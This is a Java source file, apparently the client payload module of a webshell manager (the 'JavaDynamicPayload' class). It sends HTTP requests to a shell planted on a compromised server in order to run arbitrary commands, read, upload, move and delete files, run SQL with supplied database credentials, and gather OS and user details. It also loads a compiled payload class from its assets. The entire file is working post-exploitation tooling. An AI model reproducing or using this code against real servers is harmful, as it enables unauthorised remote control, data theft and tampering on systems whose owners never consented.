package shells.payloads.java;

import core.Encoding;
import core.annotation.PayloadAnnotation;
import core.imp.Payload;
import core.shell.ShellEntity;
import util.Log;
import util.functions;
import util.http.Http;
import util.http.ReqParameter;

import java.io.InputStream;
import java.util.Map;

@PayloadAnnotation(
        Name = "JavaDynamicPayload"
)
public class JavaShell implements Payload {
    private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser) : (.+)";
    private static final String[] ALL_DATABASE_TYPE = new String[]{"mysql", "oracle", "sqlserver", "postgresql"};
    private ShellEntity shell;
    private Http http;
    private Encoding encoding;
    private String fileRoot;
    private String currentDir;
    private String currentUser;
    private String osInfo;
    private String basicsInfo;

    public JavaShell() {
    }

    public void init(ShellEntity shellContext) {
        this.shell = shellContext;
        this.http = this.shell.getHttp();
        this.encoding = Encoding.getEncoding(this.shell);
    }

    public String getFile(String filePath) {
        filePath = functions.formatDir(filePath);
        ReqParameter parameters = new ReqParameter();
        parameters.add("dirName", this.encoding.Encoding(filePath.length() > 0 ? filePath : " "));
        return this.encoding.Decoding(this.evalFunc(null, "getFile", parameters));
    }

    public byte[] downloadFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        return this.evalFunc(null, "readFile", parameter);
    }

    public String getBasicsInfo() {
        if (this.basicsInfo == null) {
            ReqParameter parameter = new ReqParameter();
            this.basicsInfo = this.encoding.Decoding(this.evalFunc(null, "getBasicsInfo", parameter));
        }

        Map pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser) : (.+)");
        this.fileRoot = (String) pxMap.get("FileRoot");
        this.currentDir = (String) pxMap.get("CurrentDir");
        this.currentUser = (String) pxMap.get("CurrentUser");
        this.osInfo = (String) pxMap.get("OsInfo");
        return this.basicsInfo;
    }

    public boolean include(String codeName, byte[] binCode) {
        ReqParameter parameters = new ReqParameter();
        parameters.add("codeName", codeName);
        parameters.add("binCode", binCode);
        byte[] result = this.evalFunc(null, "include", parameters);
        String resultString = (new String(result)).trim();
        if (resultString.equals("ok")) {
            return true;
        } else {
            Log.error(resultString);
            return false;
        }
    }

    public byte[] evalFunc(String className, String funcName, ReqParameter praameter) {
        if (className != null && className.trim().length() > 0) {
            praameter.add("evalClassName", className);
        }

        praameter.add("methodName", funcName);
        byte[] data = praameter.format().getBytes();
        return this.http.sendHttpResponse(data).getResult();
    }

    public boolean uploadFile(String fileName, byte[] data) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        parameter.add("fileValue", data);
        byte[] result = this.evalFunc(null, "uploadFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean copyFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", fileName);
        parameter.add("destFileName", newFile);
        byte[] result = this.evalFunc(null, "copyFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean deleteFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc(null, "deleteFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newFile(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("fileName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc(null, "newFile", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public boolean newDir(String fileName) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dirName", this.encoding.Encoding(fileName));
        byte[] result = this.evalFunc(null, "newDir", parameter);
        String stateString = this.encoding.Decoding(result);
        if ("ok".equals(stateString)) {
            return true;
        } else {
            Log.error(stateString);
            return false;
        }
    }

    public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, String execSql) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("dbType", dbType);
        parameter.add("dbHost", dbHost);
        parameter.add("dbPort", Integer.toString(dbPort));
        parameter.add("dbUsername", dbUsername);
        parameter.add("dbPassword", dbPassword);
        parameter.add("execType", execType);
        parameter.add("execSql", this.encoding.Encoding(execSql));
        byte[] result = this.evalFunc(null, "execSql", parameter);
        return this.encoding.Decoding(result);
    }

    public String currentDir() {
        if (this.currentDir != null) {
            return functions.formatDir(this.currentDir);
        } else {
            this.getBasicsInfo();
            return functions.formatDir(this.currentDir);
        }
    }

    public boolean test() {
        ReqParameter parameter = new ReqParameter();
        byte[] result = this.evalFunc(null, "test", parameter);
        String codeString = new String(result);
        if (codeString.trim().equals("ok")) {
            return true;
        } else {
            Log.error(codeString);
            return false;
        }
    }

    public String currentUserName() {
        if (this.currentUser != null) {
            return this.currentUser;
        } else {
            this.getBasicsInfo();
            return this.currentUser;
        }
    }

    public String[] listFileRoot() {
        if (this.fileRoot != null) {
            return this.fileRoot.split(";");
        } else {
            this.getBasicsInfo();
            return this.fileRoot.split(";");
        }
    }

    public String execCommand(String commandStr) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmdLine", this.encoding.Encoding(commandStr));
        byte[] result = this.evalFunc(null, "execCommand", parameter);
        return this.encoding.Decoding(result);
    }

    public String getOsInfo() {
        if (this.osInfo != null) {
            return this.osInfo;
        } else {
            this.getBasicsInfo();
            return this.osInfo;
        }
    }

    public String[] getAllDatabaseType() {
        return ALL_DATABASE_TYPE;
    }

    public boolean moveFile(String fileName, String newFile) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("srcFileName", this.encoding.Encoding(fileName));
        parameter.add("destFileName", this.encoding.Encoding(newFile));
        byte[] result = this.evalFunc(null, "moveFile", parameter);
        String stasteString = this.encoding.Decoding(result);
        if ("ok".equals(stasteString)) {
            return true;
        } else {
            Log.error(stasteString);
            return false;
        }
    }

    public byte[] getPayload() {
        byte[] data = null;

        try {
            InputStream fileInputStream = JavaShell.class.getResourceAsStream("assets/payload.classs");
            data = functions.readInputStream(fileInputStream);
            fileInputStream.close();
        } catch (Exception var4) {
            Log.error(var4);
        }

        return data;
    }
}
